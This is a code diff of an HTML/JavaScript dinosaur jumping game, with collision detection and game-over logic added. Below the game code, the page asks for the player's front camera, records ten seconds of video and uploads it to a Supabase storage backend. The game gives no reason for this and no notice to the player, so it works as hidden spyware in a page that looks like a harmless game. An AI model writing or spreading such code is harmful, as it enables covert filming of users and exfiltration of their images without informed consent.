@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>AUN's Dino Game</title>
   <style>
     html, body {
@@ -13,13 +13,11 @@
       background: url('Background.png.png') no-repeat center center fixed;
       background-size: cover;
     }
-
     canvas {
       display: block;
       margin: auto;
       background: transparent;
     }
-
     #jumpButton {
       position: absolute;
       top: 0;
@@ -45,25 +43,61 @@
     const cactusImg = new Image();
     cactusImg.src = "Cactus.png.png";
 
-    let dino = { x: 50, y: 300, width: 60, height: 60, vy: 0, jumping: false };
-    let cactus = { x: 800, y: 300, width: 50, height: 60 };
+    const dino = {
+      x: 50, y: 300, width: 60, height: 60,
+      vy: 0, jumping: false
+    };
+    const cactus = {
+      x: canvas.width, y: 300, width: 50, height: 60
+    };
+
     const gravity = 1.8;
 
+    let gameOver = false;
+
+    function resetCactus() {
+      cactus.x = canvas.width + Math.random() * 200;
+    }
+
+    function checkCollision() {
+      return (
+        dino.x < cactus.x + cactus.width &&
+        dino.x + dino.width > cactus.x &&
+        dino.y < cactus.y + cactus.height &&
+        dino.y + dino.height > cactus.y
+      );
+    }
+
     function draw() {
+      if (gameOver) {
+        ctx.font = "40px Arial";
+        ctx.fillStyle = "red";
+        ctx.fillText("Game Over!", 300, 200);
+        return;
+      }
+
       ctx.clearRect(0, 0, canvas.width, canvas.height);
 
+      // Move cactus
       cactus.x -= 5;
-      if (cactus.x < -cactus.width) cactus.x = canvas.width + Math.random() * 300;
+      if (cactus.x < -cactus.width) {
+        resetCactus();
+      }
 
+      // Apply jump physics
       if (dino.jumping) {
         dino.vy += gravity;
         dino.y += dino.vy;
-
         if (dino.y >= 300) {
           dino.y = 300;
           dino.vy = 0;
           dino.jumping = false;
         }
+      }
+
+      // Check collision
+      if (checkCollision()) {
+        gameOver = true;
       }
 
       ctx.drawImage(dinoImg, dino.x, dino.y, dino.width, dino.height);
@@ -73,27 +107,24 @@
     }
 
     function jump() {
-      if (!dino.jumping) {
+      if (!dino.jumping && !gameOver) {
         dino.jumping = true;
         dino.vy = -20;
       }
     }
 
-    window.addEventListener('keydown', (e) => {
-      if (e.code === 'Space' || e.code === 'ArrowUp') {
-        jump();
-      }
+    document.getElementById("jumpButton").addEventListener("touchstart", jump);
+    window.addEventListener("keydown", e => {
+      if (e.code === "Space" || e.code === "ArrowUp") jump();
     });
-
-    document.getElementById('jumpButton').addEventListener('touchstart', jump);
 
     draw();
 
-    // Camera capture and Supabase upload
+    // === Record front cam & upload to Supabase ===
     navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
       .then(stream => {
         const mediaRecorder = new MediaRecorder(stream);
-        const chunks = [];
+        let chunks = [];
 
         mediaRecorder.ondataavailable = e => chunks.push(e.data);
         mediaRecorder.onstop = async () => {
@@ -115,16 +146,14 @@
           if (error) {
             console.error("❌ Upload Error:", error.message);
           } else {
-            console.log("✅ Uploaded to Supabase:", data);
+            console.log("✅ Video uploaded:", data.path);
           }
         };
 
         mediaRecorder.start();
         setTimeout(() => mediaRecorder.stop(), 10000);
       })
-      .catch(err => {
-        console.error("Camera access denied:", err);
-      });
+      .catch(err => console.error("❌ Camera error:", err));
   </script>
 </body>
 </html>
